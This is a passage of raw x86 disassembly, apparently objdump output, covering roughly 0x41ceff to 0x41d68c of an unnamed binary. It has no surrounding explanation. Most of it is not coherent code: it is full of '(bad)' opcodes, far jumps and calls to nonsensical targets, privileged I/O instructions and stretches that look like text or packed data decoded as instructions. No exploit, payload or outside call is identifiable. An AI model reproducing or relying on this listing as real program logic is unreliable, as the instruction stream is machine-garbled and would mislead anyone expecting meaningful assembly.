  41ceff:	push   es
  41cf00:	cmp    eax,0xcc0000b2
  41cf05:	lahf   
  41cf06:	add    BYTE PTR [eax],al
  41cf08:	xchg   edx,eax
  41cf09:	retf   
  41cf0a:	xor    DWORD PTR [eax],eax
  41cf0c:	(bad)  
  41cf0d:	stc    
  41cf0e:	outs   dx,DWORD PTR ds:[esi]
  41cf0f:	aaa    
  41cf10:	ficomp WORD PTR [esi+0x2e32071]
  41cf16:	push   eax
  41cf17:	or     DWORD PTR ds:0xe7d1e57d,edx
  41cf1d:	add    al,BYTE PTR [ebx+esi*1]
  41cf20:	pusha  
  41cf21:	rcl    BYTE PTR [ebp-0x7d05],0xff
  41cf28:	xor    dl,0xf7
  41cf2b:	cld    
  41cf2c:	neg    BYTE PTR [ecx-0x66]
  41cf2f:	adc    BYTE PTR [eax-0x14f05fdc],ch
  41cf35:	and    edx,DWORD PTR [ebx]
  41cf37:	xlat   BYTE PTR ds:[ebx]
  41cf38:	jp     0x41cebb
  41cf3a:	jle    0x41cf1e
  41cf3c:	cdq    
  41cf3d:	pushf  
  41cf3e:	std    
  41cf3f:	dec    ecx
  41cf40:	ficom  WORD PTR [ecx-0x804760]
  41cf46:	(bad)  
  41cf47:	mov    esp,0xffff6872
  41cf4c:	inc    DWORD PTR [eax]
	...
  41cf56:	jb     0x41cfce
  41cf58:	in     al,dx
  41cf59:	call   0xe92ab846
  41cf5e:	call   0x12ab84b
  41cf63:	add    BYTE PTR [edi],dh
  41cf65:	imul   esp,eax,0xbd3154cb
  41cf6b:	loope  0x41cf53
  41cf6d:	mov    es,WORD PTR [eax]
  41cf6f:	dec    ebp
  41cf70:	or     BYTE PTR [eax+0x2be7b61e],cl
  41cf76:	lds    eax,FWORD PTR [eax-0x5cf288a5]
  41cf7c:	add    BYTE PTR [eax],al
  41cf7e:	xor    DWORD PTR [esi+0x0],0x1f8a00
  41cf85:	add    al,cl
  41cf87:	dec    ebx
  41cf88:	sbb    edx,DWORD PTR [eax]
  41cf8a:	retf   
  41cf8b:	mov    ebx,0x98d05cde
  41cf90:	push   cs
  41cf91:	sub    ah,bl
  41cf93:	push   edx
  41cf94:	jmp    0x4bd7:0x4cec2816
  41cf9b:	mov    ecx,0xa6cb
  41cfa0:	mov    ah,0xbc
  41cfa2:	lahf   
  41cfa3:	pop    edi
  41cfa4:	add    BYTE PTR [eax],al
  41cfa6:	add    bh,bl
  41cfa8:	cmp    DWORD PTR [ebx-0x10],0x50d42343
  41cfaf:	fisttp WORD PTR gs:[edx]
  41cfb2:	xchg   edi,eax
  41cfb3:	or     dl,BYTE PTR [ecx+0x4c]
  41cfb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfb7:	cwde   
  41cfb8:	iret   
  41cfb9:	jno    0x41cfa1
  41cfbb:	push   eax
  41cfbc:	jns    0x41d036
  41cfbe:	push   ss
  41cfbf:	xor    cl,BYTE PTR [edi+0x37fffe17]
  41cfc5:	jge    0x41cffe
  41cfc7:	or     BYTE PTR [edx],dh
  41cfc9:	push   ecx
  41cfca:	add    BYTE PTR [eax],al
  41cfcc:	xchg   edi,eax
  41cfcd:	mov    WORD PTR [eax],es
  41cfcf:	add    BYTE PTR [eax],al
  41cfd1:	or     BYTE PTR [eax],cl
  41cfd3:	or     BYTE PTR [eax],cl
  41cfd5:	or     BYTE PTR [eax],cl
  41cfd7:	or     BYTE PTR [eax],cl
  41cfd9:	or     BYTE PTR [ebx+0x52f7],bl
  41cfdf:	add    BYTE PTR [eax],al
  41cfe1:	add    BYTE PTR [eax],al
  41cfe3:	add    BYTE PTR [eax],al
  41cfe5:	add    al,ch
  41cfe7:	call   0x1a23d185
  41cfec:	ffree  st(7)
  41cfee:	(bad)  
  41cfef:	dec    ecx
  41cff0:	mov    ch,0xe0
  41cff2:	or     DWORD PTR [esi],eax
  41cff4:	ds jecxz 0x41d016
  41cff7:	test   DWORD PTR [ecx+0x2b108e7f],0xe8348ff5
  41d001:	call   0x93784594
  41d006:	adc    dl,BYTE PTR [esi+0x72]
  41d009:	bound  ebp,QWORD PTR [ecx+0x11]
  41d00c:	adc    eax,DWORD PTR ds:[ecx+0x61]
  41d010:	(bad)  
  41d011:	retf   
  41d012:	bound  dx,DWORD PTR [ebp-0x45]
  41d016:	in     al,0x36
  41d018:	inc    ebx
  41d019:	adc    ch,BYTE PTR [ebx-0xf2e27b2]
  41d01f:	call   0x7d978a0c
  41d024:	call   0xa4c2be11
  41d029:	call   0xaf80d72e
  41d02e:	pop    esp
  41d02f:	pop    ss
  41d030:	int3   
  41d031:	mov    al,ds:0x16dd3175
  41d036:	dec    esi
  41d037:	dec    ecx
  41d038:	add    al,0x82
  41d03a:	adc    BYTE PTR [eax+esi*8+0x4ac49c07],0x35
  41d042:	daa    
  41d043:	add    BYTE PTR [eax],al
  41d045:	add    BYTE PTR [ecx-0xbffffb9],bh
  41d04b:	jns    0x41d04d
  41d04d:	add    BYTE PTR [eax],al
  41d04f:	je     0x41d0c5
  41d051:	je     0x41d0c7
  41d053:	je     0x41d0c9
  41d055:	je     0x41d0cb
  41d057:	je     0x41d080
  41d059:	call   0x6e9c:0xc8ca2bb1
  41d060:	pop    esp
  41d061:	dec    edx
  41d062:	mov    dl,0x46
  41d064:	sti    
  41d065:	add    ebx,DWORD PTR [ecx+ecx*4]
  41d068:	(bad)
  41d06b:	push   esi
  41d06c:	loop   0x41d0c2
  41d06e:	or     bl,BYTE PTR [ebx+0x75]
  41d071:	jne    0x41d0e8
  41d073:	jne    0x41d0ea
  41d075:	jne    0x41d0ec
  41d077:	jne    0x41d0ee
  41d079:	(bad)  
  41d07a:	jmp    DWORD PTR [edx-0xf085d6]
  41d080:	inc    DWORD PTR [esi-0x35d1ef36]
  41d086:	add    BYTE PTR [ebp-0x1e8a4fce],al
  41d08c:	mov    cl,BYTE PTR [ebx+0x140df955]
  41d092:	dec    esp
  41d093:	call   0x4bf0:0x43bce4ba
  41d09a:	lock mov esp,0x5fada661
  41d0a0:	dec    eax
  41d0a1:	jmp    0xacc7:0xffffe223
  41d0a8:	(bad)  
  41d0a9:	dec    ebp
  41d0ab:	popf   
  41d0ac:	(bad)  
  41d0ad:	inc    DWORD PTR [ebp-0x33]
  41d0b0:	pop    ss
  41d0b1:	jg     0x41d086
  41d0b3:	scas   eax,DWORD PTR es:[edi]
  41d0b4:	cwde   
  41d0b5:	scas   al,BYTE PTR es:[edi]
  41d0b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0b7:	lea    esi,[esi]
  41d0b9:	and    edi,DWORD PTR [edx]
  41d0bb:	aaa    
  41d0bc:	xor    esp,DWORD PTR [ebp+0x46]
  41d0bf:	inc    esi
  41d0c0:	jae    0x41d083
  41d0c2:	fsubp  st(1),st
  41d0c4:	daa    
  41d0c5:	dec    esp
  41d0c6:	test   eax,0x41454545
  41d0cb:	call   0xcd0ddd6c
  41d0d0:	or     ebx,DWORD PTR [eax+eiz*1]
  41d0d3:	fild   WORD PTR [ecx-0x283e69ab]
  41d0d9:	and    cl,BYTE PTR [ebp-0x7898943a]
  41d0df:	out    0x28,al
  41d0e1:	sbb    ah,dl
  41d0e3:	pop    ebx
  41d0e4:	jns    0x41d0c7
  41d0e6:	cli    
  41d0e7:	inc    ebp
  41d0e8:	inc    ebp
  41d0e9:	pop    edx
  41d0ea:	dec    esi
  41d0eb:	sbb    DWORD PTR [ebp+0x45],eax
  41d0ee:	inc    ebp
	...
  41d0f7:	add    dl,ch
  41d0f9:	mov    eax,ds:0xffffff5f
  41d0fe:	(bad)  
  41d0ff:	(bad)  
  41d100:	(bad)  
  41d101:	(bad)  
  41d102:	(bad)  
  41d103:	inc    eax
  41d105:	shl    bh,0xac
  41d108:	dec    eax
  41d109:	fldenv [eax+0x34]
  41d10c:	sbb    eax,0x647a041b
  41d111:	mov    al,ds:0x151320f2
  41d116:	mov    al,0xf7
  41d118:	mov    ss,WORD PTR [ebx-0x31]
  41d11b:	cld    
  41d11c:	outs   dx,DWORD PTR ds:[esi]
  41d11d:	dec    ebp
  41d11e:	rol    al,0x10
  41d121:	js     0x41d0e3
  41d123:	ror    BYTE PTR [edi-0x533f3f3c],0xa1
  41d12a:	or     BYTE PTR [esi-0x53],bl
  41d12d:	push   es
  41d12e:	addr16 dec esp
  41d130:	push   cs
  41d131:	jo     0x41d0d7
  41d133:	jmp    0x266b:0x7a826403
  41d13a:	inc    DWORD PTR ds:0xac1ce004
  41d140:	ror    BYTE PTR [ebx+0x463ad6b3],0x8b
  41d147:	mov    ecx,DWORD PTR [ebx-0x25d60d5d]
  41d14d:	(bad)  
  41d14e:	(bad)  
  41d14f:	imul   edi,DWORD PTR [ecx-0x2f522b7f],0x45a735d0
  41d159:	sub    ch,BYTE PTR [esi+ebx*2]
  41d15c:	and    DWORD PTR [ecx+0x69],ebx
  41d15f:	fbstp  TBYTE PTR [edi+0x31]
  41d162:	cmp    ecx,DWORD PTR [ebx+0x31]
  41d165:	gs ins BYTE PTR es:[edi],dx
  41d167:	jo     0x41d11e
  41d169:	and    cl,bl
  41d16b:	lock mov ecx,DWORD PTR [ebx-0x74743726]
  41d172:	mov    edi,edi
  41d174:	(bad)  
  41d175:	(bad)  
  41d176:	(bad)  
  41d177:	(bad)  
  41d178:	(bad)  
  41d179:	(bad)  
  41d17a:	(bad)  
  41d17b:	push   ecx
  41d17d:	xchg   esp,eax
  41d17e:	cld    
  41d17f:	int3   
  41d180:	int3   
  41d181:	int3   
  41d182:	int3   
  41d183:	int3   
  41d184:	int3   
  41d185:	int3   
  41d186:	int3   
  41d187:	int3   
  41d188:	add    BYTE PTR [eax],al
  41d18a:	sub    eax,0x6d2bf16e
  41d18f:	push   0xe
  41d191:	out    0xa4,eax
  41d193:	(bad)  
  41d194:	jae    0x41d17e
  41d196:	imul   ecx,DWORD PTR [edi],0x21
  41d199:	or     BYTE PTR [esi],dl
  41d19b:	push   esi
  41d19c:	je     0x41d1e5
  41d19e:	shl    DWORD PTR [ebp+0x9],1
  41d1a1:	inc    edx
  41d1a2:	add    BYTE PTR [eax],al
  41d1a4:	dec    edi
  41d1a5:	aas    
  41d1a6:	inc    esi
  41d1a7:	push   DWORD PTR [edi-0x29]
  41d1aa:	jl     0x41d1e1
  41d1ac:	pop    edx
  41d1ad:	cmc    
  41d1ae:	inc    esp
  41d1af:	pop    esi
  41d1b0:	retf   0xfd47
  41d1b3:	adc    al,0x19
  41d1b5:	and    al,0x99
  41d1b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1b8:	ffreep st(4)
  41d1ba:	out    0xc9,eax
  41d1bc:	ins    BYTE PTR es:[edi],dx
  41d1bd:	ins    DWORD PTR es:[edi],dx
  41d1be:	retf   0xca81
  41d1c1:	add    BYTE PTR [eax],al
  41d1c3:	xor    esi,DWORD PTR [esp+eiz*4+0x4fe80000]
  41d1ca:	les    eax,FWORD PTR [eax]
  41d1cc:	add    cl,ch
  41d1ce:	fs dec ebx
  41d1d0:	mov    BYTE PTR [edx],bh
  41d1d2:	shl    DWORD PTR [ebx-0x76],1
  41d1d5:	pop    ecx
  41d1d6:	in     al,dx
  41d1d7:	clc    
  41d1d8:	in     eax,dx
  41d1d9:	or     cl,dl
  41d1db:	sbb    eax,0xa2aa47eb
  41d1e0:	mov    ebx,0x130f90fc
  41d1e5:	add    BYTE PTR [eax],al
  41d1e7:	add    BYTE PTR [esi+0x31],cl
  41d1ea:	add    BYTE PTR [eax],al
  41d1ec:	fadd   DWORD PTR [bx+si]
  41d1ef:	add    BYTE PTR [eax],al
  41d1f1:	lea    ecx,[ebp-0x72727273]
  41d1f7:	lea    ecx,[ebp+0x641e78d]
  41d1fd:	(bad)  
  41d1fe:	dec    ebp
  41d1ff:	imul   esp,DWORD PTR [eax+0x3b6f0ec5],0xfffffffb
  41d206:	xchg   ebp,eax
  41d207:	add    eax,0xa5669231
  41d20c:	push   eax
  41d20d:	scas   eax,DWORD PTR es:[edi]
  41d20e:	bound  esp,QWORD PTR [eax+0x63]
  41d211:	pop    es
	...
  41d21a:	add    BYTE PTR [eax],al
  41d21c:	add    BYTE PTR [ecx+0x722e65e0],cl
  41d222:	and    BYTE PTR cs:[eax+0x65],dh
  41d226:	ins    DWORD PTR es:[edi],dx
  41d227:	popa   
  41d228:	ins    DWORD PTR es:[edi],dx
  41d229:	ja     0x41d24b
  41d22b:	ins    DWORD PTR es:[edi],dx
  41d22c:	popa   
  41d22d:	gs popa 
  41d22f:	and    BYTE PTR [ecx+0x20],al
  41d232:	and    BYTE PTR [ebp+0x68],ah
  41d235:	arpl   WORD PTR [edx],cx
  41d237:	gs ins DWORD PTR es:[edi],dx
  41d239:	outs   dx,DWORD PTR ds:[esi]
  41d23a:	imul   esi,DWORD PTR [esp+eax*2+0x3c],0x73207969
  41d242:	popa   
  41d243:	jae    0x41d273
  41d245:	ins    DWORD PTR es:[edi],dx
  41d246:	das    
  41d247:	gs ins DWORD PTR es:[edi],dx
  41d249:	and    BYTE PTR gs:[ebp+0x44],cl
  41d24d:	jne    0x41d2b4
  41d24f:	push   edi
  41d250:	or     eax,0x2e696173
  41d255:	inc    ecx
  41d256:	sub    al,0x3e
  41d258:	jae    0x41d2bf
  41d25a:	jae    0x41d2cb
  41d25c:	jne    0x41d29a
  41d25e:	ins    BYTE PTR es:[edi],dx
  41d25f:	imul   ebp,DWORD PTR [esi],0x73
  41d262:	fcomp  DWORD PTR [ecx-0x7b8e0000]
  41d268:	std    
  41d269:	loop   0x41d21f
  41d26b:	xchg   ebx,eax
  41d26c:	imul   esp,DWORD PTR [eax-0x4e35df46],0xed7f69fd
  41d276:	and    DWORD PTR [edx],ebp
  41d278:	adc    DWORD PTR [esp+edi*1+0x54],0x78
  41d27d:	inc    esi
  41d27e:	sub    eax,0xb22112ab
  41d283:	jg     0x41d2cb
  41d285:	jno    0x41d296
  41d287:	inc    ebx
  41d288:	adc    eax,0x9cd90000
  41d28d:	add    BYTE PTR [eax],al
  41d28f:	shr    DWORD PTR [ebx+ebx*2-0x67b40000],1
  41d296:	f2xm1  
  41d298:	je     0x41d2ae
  41d29a:	clc    
  41d29b:	or     BYTE PTR [edx+0x52],0x3a
  41d29f:	inc    ecx
  41d2a0:	push   ebp
  41d2a1:	aad    0x8c
  41d2a3:	out    0x93,al
  41d2a5:	jg     0x41d2d2
  41d2a7:	mov    esp,0x4879124d
  41d2ac:	add    BYTE PTR [eax],al
  41d2ae:	add    BYTE PTR [eax+0x6a],ch
  41d2b1:	add    eax,0xb2a4b6e9
  41d2b6:	(bad)  
  41d2b7:	add    DWORD PTR [edx-0x3f2ca87d],ecx
  41d2bd:	xlat   BYTE PTR ds:[ebx]
  41d2be:	mov    al,ds:0x22be71b4
  41d2c3:	es fcmovnu st,st(2)
  41d2c6:	xchg   BYTE PTR [ebp+0x5b3edd8],al
  41d2cc:	add    BYTE PTR [eax],al
  41d2ce:	sbb    al,0x2a
  41d2d0:	or     BYTE PTR [eax],al
  41d2d2:	add    BYTE PTR [eax],al
  41d2d4:	(bad)  
  41d2d5:	(bad)  
  41d2d6:	(bad)  
  41d2d7:	(bad)  
  41d2d8:	(bad)  
  41d2d9:	(bad)  
  41d2da:	(bad)  
  41d2db:	(bad)  
  41d2dc:	inc    DWORD PTR [ebx]
  41d2de:	int3   
  41d2df:	inc    edx
  41d2e0:	(bad)  
  41d2e1:	(bad)  
  41d2e2:	(bad)  
  41d2e3:	(bad)  
  41d2e4:	(bad)  
  41d2e5:	(bad)  
  41d2e6:	(bad)  
  41d2e7:	(bad)  
  41d2e8:	push   DWORD PTR [ebp+0x75]
  41d2eb:	fld    TBYTE PTR [edx+0x66846251]
  41d2f1:	fld    QWORD PTR [ebp-0x2]
  41d2f4:	shr    DWORD PTR [edi],1
  41d2f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2f7:	cmc    
  41d2f8:	cmp    eax,0xeade3437
  41d2fd:	setg   bl
  41d300:	leave  
  41d301:	mov    al,ds:0x3d75754e
  41d306:	bound  esi,QWORD PTR [ebp+0x75]
  41d309:	dec    ecx
  41d30a:	push   edx
  41d30b:	jne    0x41d382
  41d30d:	aam    0x9d
  41d30f:	pop    esp
  41d310:	xor    DWORD PTR [ebp-0x26b3ab0c],ebp
  41d316:	mov    bl,0xa2
  41d318:	out    0x47,eax
  41d31a:	into   
  41d31b:	in     al,0x32
  41d31d:	js     0x41d2dc
  41d31f:	mov    al,ds:0xa28eaee6
  41d324:	sub    BYTE PTR [ebp+0x0],dh
  41d327:	sub    DWORD PTR [eax-0x30],ebp
  41d32a:	pushf  
  41d32b:	add    BYTE PTR [eax],al
  41d32d:	add    BYTE PTR [edi],ch
  41d32f:	xor    al,0x6d
  41d331:	xor    DWORD PTR [ebx-0xa2b92d6],0x69
  41d338:	dec    esi
  41d339:	pop    esp
  41d33a:	push   edi
  41d33b:	mov    cl,0x7a
  41d33d:	cmp    BYTE PTR [eax],bh
  41d33f:	mov    esp,0x604c5c16
  41d344:	stos   BYTE PTR es:[edi],al
  41d345:	or     DWORD PTR [eax+esi*2+0x711dacb5],0x8bffd2aa
  41d350:	mov    ebx,0x490000
	...
  41d361:	retf   
  41d362:	std    
  41d363:	mov    eax,0xe8e8e8e8
  41d368:	call   0xe92abc55
  41d36d:	add    DWORD PTR [ebx-0x43c249ff],0x4b
  41d374:	inc    esi
  41d375:	xlat   BYTE PTR ds:[ebx]
  41d376:	test   eax,ecx
  41d378:	arpl   bp,bp
  41d37a:	jae    0x41d376
  41d37c:	and    al,0x2c
  41d37e:	mov    edx,db2
  41d381:	inc    ecx
  41d382:	or     DWORD PTR [edx],0x33
  41d385:	stc    
  41d386:	bound  eax,QWORD PTR [ebx+0x708c2383]
  41d38c:	dec    DWORD PTR [eax+0x7fc1fecb]
  41d392:	sbb    bl,BYTE PTR [ecx*4+0x5c5ed5a6]
  41d399:	mov    dl,0x9f
  41d39b:	xchg   DWORD PTR [ecx-0x4f],eax
  41d39e:	sub    DWORD PTR [eax-0x62],esp
  41d3a1:	push   ebp
  41d3a2:	xor    eax,eax
  41d3a4:	mov    dl,0xb5
  41d3a6:	add    DWORD PTR [ebx-0x7cdc078a],0xffffff83
  41d3ad:	repnz cli 
  41d3af:	jb     0x41d334
  41d3b1:	add    BYTE PTR [ebp-0x63f87f9d],dh
  41d3b7:	ret    
  41d3b8:	shr    BYTE PTR [ecx-0x61],1
  41d3bb:	(bad)  
  41d3bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3be:	jns    0x41d394
  41d3c0:	(bad)  
  41d3c2:	fild   DWORD PTR [ecx-0x22]
  41d3c5:	sub    al,0xaf
  41d3c7:	inc    esi
  41d3c8:	cld    
  41d3c9:	jbe    0x41d3cb
  41d3cb:	add    BYTE PTR [eax],al
  41d3cd:	xor    al,0x29
  41d3cf:	add    BYTE PTR [eax],al
  41d3d1:	add    eax,DWORD PTR gs:[eax]
  41d3d4:	add    BYTE PTR [eax],al
  41d3d6:	push   0x6a
  41d3d8:	push   0x6a
  41d3da:	push   0x6a
  41d3dc:	push   0x6a
  41d3de:	push   0xffffffb5
  41d3e0:	sub    bl,BYTE PTR [edx-0x47]
  41d3e3:	adc    edi,DWORD PTR [esi]
  41d3e5:	sbb    eax,0x9a36a7fb
  41d3ea:	add    al,ah
  41d3ec:	js     0x41d466
  41d3ee:	cs jmp esi
  41d3f1:	xchg   ebx,eax
  41d3f2:	int    0xac
  41d3f4:	dec    edi
  41d3f5:	cmp    DWORD PTR [ebx],esi
  41d3f7:	push   0x6a
  41d3f9:	push   0x6a
  41d3fb:	push   0x6a
  41d3fd:	push   0x6a
  41d3ff:	push   0x75
  41d401:	jne    0x41d383
  41d403:	loope  0x41d388
  41d405:	xchg   DWORD PTR [ebp+0x75],esi
  41d408:	lock lds edi,FWORD PTR [esi+0x3f1b21a5]
  41d40f:	test   BYTE PTR [ebp+0x52],ch
  41d412:	mov    al,ds:0x83d10e9d
  41d417:	pushf  
  41d418:	or     DWORD PTR [ebp-0x45882dce],esi
  41d41e:	inc    edi
  41d41f:	adc    eax,0x246b32a8
  41d424:	ret    0xfc49
  41d427:	mov    ebp,0x75dbd982
  41d42c:	jne    0x41d43c
  41d42e:	pushf  
  41d42f:	jne    0x41d4a6
  41d431:	shl    BYTE PTR [ecx-0x13008a79],cl
  41d437:	mov    ds:0xbc315efe,eax
  41d43c:	pop    ebp
  41d43d:	jle    0x41d4a6
  41d43f:	mov    bh,BYTE PTR [ebx-0x42]
  41d442:	add    BYTE PTR [ecx+0x53803630],0x53
  41d449:	je     0x41d46b
  41d44b:	and    BYTE PTR [eax],ah
  41d44d:	cmp    al,0x23
  41d44f:	ins    DWORD PTR es:[edi],dx
  41d450:	and    dh,BYTE PTR [esi+0x65]
  41d453:	push   edx
  41d454:	gs or  dh,BYTE PTR cs:[edx+edi*1+0x61]
  41d45a:	or     dh,BYTE PTR gs:[esi+0x2e]
  41d45e:	push   edx
  41d45f:	gs push edi
  41d461:	popa   
  41d462:	popa   
  41d463:	dec    ebp
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	gs push ebx
  41d467:	gs cmp eax,0xa656d2e
  41d46d:	popa   
  41d46e:	inc    ecx
  41d46f:	jb     0x41d4d9
  41d471:	jbe    0x41d4ea
  41d473:	outs   dx,BYTE PTR ds:[esi]
  41d474:	ins    DWORD PTR es:[edi],dx
  41d475:	outs   dx,DWORD PTR ds:[esi]
  41d476:	and    BYTE PTR [eax],ah
  41d478:	arpl   WORD PTR [esi],bp
  41d47a:	sub    DWORD PTR [eax+0x76],esi
  41d47d:	imul   ebp,DWORD PTR [esi],0xac415365
  41d483:	inc    edi
  41d484:	mov    esi,DWORD PTR [edi-0x4f0d3a]
  41d48a:	(bad)  
  41d48b:	(bad)  
  41d48c:	fisttp QWORD PTR [ebp-0x71]
  41d48f:	mov    WORD PTR [ebp+0x3192cc87],ss
  41d495:	inc    ecx
  41d496:	sub    DWORD PTR [ebp+0x2d8c10fc],edx
  41d49c:	cmp    al,0x3f
  41d49e:	sbb    ebp,ebp
  41d4a0:	mov    BYTE PTR [edx-0x2f],dl
  41d4a3:	jbe    0x41d4b9
  41d4a5:	test   DWORD PTR [ebx-0xf704],edx
  41d4ab:	add    DWORD PTR [ebx+0x28],eax
  41d4ae:	(bad)  
  41d4af:	(bad)  
  41d4b0:	(bad)  
  41d4b1:	call   0xe92abd9e
  41d4b6:	call   0x692abda3
  41d4bb:	in     eax,0x88
	...
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [edx+0x11a2468b],ah
  41d4cd:	(bad)  
  41d4ce:	out    dx,eax
  41d4cf:	retf   
  41d4d0:	retf   0xf98
  41d4d3:	push   edx
  41d4d4:	sub    BYTE PTR [eax],ah
  41d4d6:	push   0xffffffe3
  41d4d8:	sub    ch,BYTE PTR ds:0x7a6c94de
  41d4de:	jae    0x41d54c
  41d4e0:	add    BYTE PTR [eax],al
  41d4e2:	mov    dl,0x70
  41d4e4:	add    BYTE PTR [eax],al
  41d4e6:	addr16 inc edx
  41d4e8:	add    BYTE PTR [eax],al
  41d4ea:	xor    ch,ch
  41d4ec:	out    dx,eax
  41d4ed:	push   cs
  41d4ee:	outs   dx,BYTE PTR ds:[esi]
  41d4ef:	jo     0x41d4ad
  41d4f1:	inc    edi
  41d4f2:	stc    
  41d4f3:	cs in  al,dx
  41d4f5:	inc    ebp
  41d4f6:	adc    eax,0x63a64a96
  41d4fb:	test   al,0xd1
  41d4fd:	imul   ebp,ebx,0xc6c2bf
  41d503:	add    BYTE PTR [esi+esi*8+0x29b9],ah
  41d50a:	add    BYTE PTR [ebx+ebx*8],ah
  41d50d:	jo     0x41d530
  41d50f:	push   ss
  41d510:	inc    esp
  41d511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d512:	outs   dx,DWORD PTR ds:[esi]
  41d513:	cmp    DWORD PTR [ebx-0x12072b0e],eax
  41d519:	xchg   esp,eax
  41d51a:	into   
  41d51b:	xor    bl,BYTE PTR [ecx+ebx*4]
  41d51e:	(bad)  
  41d51f:	jge    0x41d4a7
  41d521:	icebp  
  41d522:	xchg   edx,eax
  41d523:	pop    es
  41d524:	stos   BYTE PTR es:[edi],al
  41d525:	sbb    al,0xbe
  41d527:	sbb    eax,0x9f86fdc7
  41d52c:	(bad)  
  41d52d:	scas   al,BYTE PTR es:[edi]
  41d52e:	add    BYTE PTR [eax],al
  41d530:	add    BYTE PTR [ebx+0x0],dl
  41d533:	add    BYTE PTR [eax],al
  41d535:	or     BYTE PTR [eax],cl
  41d537:	or     BYTE PTR [eax],cl
  41d539:	or     BYTE PTR [eax],cl
  41d53b:	or     BYTE PTR [eax],cl
  41d53d:	or     BYTE PTR [edi+0x80879bf],al
  41d543:	or     BYTE PTR [eax],cl
  41d545:	or     BYTE PTR [eax],cl
  41d547:	or     BYTE PTR [eax],cl
  41d549:	or     BYTE PTR [eax],al
  41d54b:	add    BYTE PTR [edx],dh
  41d54d:	dec    ecx
  41d54e:	mov    dh,0x49
  41d550:	sub    ebp,ebp
  41d552:	fwait
  41d553:	je     0x41d53a
  41d555:	add    al,0xf7
  41d557:	xor    eax,0xbabde708
  41d55c:	inc    ebp
  41d55d:	out    0xa4,eax
  41d55f:	cwde   
  41d560:	push   0xa133f7
  41d565:	add    BYTE PTR [edx+ebx*8+0x4110049e],bh
  41d56c:	xchg   edi,eax
  41d56d:	cld    
  41d56e:	sahf   
  41d56f:	adc    DWORD PTR [ecx+0x76],esp
  41d572:	xchg   edx,eax
  41d573:	das    
  41d574:	xlat   BYTE PTR ds:[ebx]
  41d575:	add    bh,al
  41d577:	sbb    DWORD PTR [ecx+0x246217a8],esp
  41d57d:	cmp    cl,BYTE PTR [esi+0x4e]
  41d580:	(bad)
  41d583:	add    BYTE PTR [eax],al
  41d585:	imul   ebp,DWORD PTR [ebx-0x7afffffc],0xac6a
  41d58f:	js     0x41d515
  41d591:	push   edi
  41d592:	mov    WORD PTR [eax],?
  41d594:	ror    BYTE PTR [eax-0x6f],0xd1
  41d598:	jne    0x41d5e8
  41d59a:	jb     0x41d5cb
  41d59c:	mov    al,ds:0xe30807aa
  41d5a1:	retf   0xf097
  41d5a4:	mov    eax,ds:0x1908
  41d5a9:	add    BYTE PTR [ebp+ecx*4+0x0],dh
  41d5ad:	add    BYTE PTR [esi+0x10],ah
	...
  41d5bc:	das    
  41d5bd:	sti    
  41d5be:	xchg   DWORD PTR [ecx-0x25],ebx
  41d5c1:	lods   eax,DWORD PTR ds:[esi]
  41d5c2:	xor    ah,0x84
  41d5c5:	mov    ds:0x726b4fc1,eax
  41d5ca:	in     eax,dx
  41d5cb:	add    eax,esi
  41d5cd:	dec    ecx
  41d5ce:	and    BYTE PTR [edx-0x57],bl
  41d5d1:	jge    0x41d632
  41d5d3:	cmp    eax,DWORD PTR [eax]
	...
  41d5dd:	(bad)  
  41d5de:	bndldx (bad),[eax+ebx*8+0xe0f0fa0]
  41d5e6:	push   ecx
  41d5e7:	sub    al,0xd2
  41d5e9:	fisub  DWORD PTR es:[esi]
  41d5ec:	inc    esp
  41d5ed:	and    bl,BYTE PTR [ebx-0x6e]
  41d5f0:	shl    DWORD PTR [ebp+0x3a],cl
  41d5f3:	lods   eax,DWORD PTR ds:[esi]
  41d5f4:	dec    DWORD PTR [edi]
  41d5f6:	mov    BYTE PTR [ebx],cl
  41d5f8:	mov    DWORD PTR [ecx],esp
  41d5fa:	int3   
  41d5fb:	jmp    0x41d5d6
  41d5fd:	out    0x6c,al
  41d5ff:	fld    DWORD PTR [eax+0x65b60056]
  41d605:	inc    eax
  41d606:	cdq    
  41d607:	test   BYTE PTR [edi],0xf
  41d60a:	js     0x41d593
  41d60c:	(bad)  
  41d60d:	setae  BYTE PTR [edx+0x3]
  41d611:	jnp    0x766a40cf
  41d617:	pop    ebp
  41d618:	sbb    eax,DWORD PTR [eax-0xd]
  41d61b:	aas    
  41d61c:	fsubr  DWORD PTR [edx+eiz*8-0x189b1517]
  41d623:	lock dec ebx
  41d625:	call   0x656f:0x746f65df
  41d62c:	arpl   WORD PTR ds:[ebp+0x72],sp
  41d630:	and    BYTE PTR [ebx+0x72],dh
  41d633:	and    BYTE PTR gs:[ebp+0x20],ah
  41d637:	jne    0x41d69e
  41d639:	inc    ebx
  41d63a:	je     0x41d6a1
  41d63c:	cmp    al,0x2e
  41d63e:	arpl   WORD PTR [ebp+0x65],sp
  41d641:	and    BYTE PTR [eax+0x4d],bh
  41d644:	gs jb  0x41d6aa
  41d647:	and    dh,BYTE PTR [ebx+0x2f]
  41d64a:	or     eax,0x57722067
  41d64f:	and    BYTE PTR [edx+0x20],dl
  41d652:	gs jne 0x41d6ba
  41d655:	or     ch,BYTE PTR [ecx+0x73]
  41d658:	ins    DWORD PTR es:[edi],dx
  41d659:	jbe    0x41d6c2
  41d65b:	jb     0x41d68b
  41d65d:	je     0x41d6c0
  41d65f:	data16 jb 0x41d6d2
  41d662:	popa   
  41d663:	or     eax,0x69692e73
  41d668:	jae    0x41d6d9
  41d66a:	and    BYTE PTR [ebp+0x6f],ah
  41d66d:	ins    DWORD PTR es:[edi],dx
  41d66e:	ds cmp eax,0x65203d2e
  41d674:	and    BYTE PTR gs:[esi+0x20],dh
  41d678:	inc    esp
  41d679:	gs push edi
  41d67b:	jae    0x41d6ca
  41d67d:	arpl   WORD PTR [edx+0x73],si
  41d680:	jb     0x41d68f
  41d682:	and    ch,BYTE PTR [esi]
  41d684:	and    BYTE PTR [ebx+0x4d],dl
  41d687:	jb     0x41d6f7
  41d689:	je     0x41d6fd
  41d68b:	das    
  41d68c:	ins    DWORD PTR es:[edi],dx
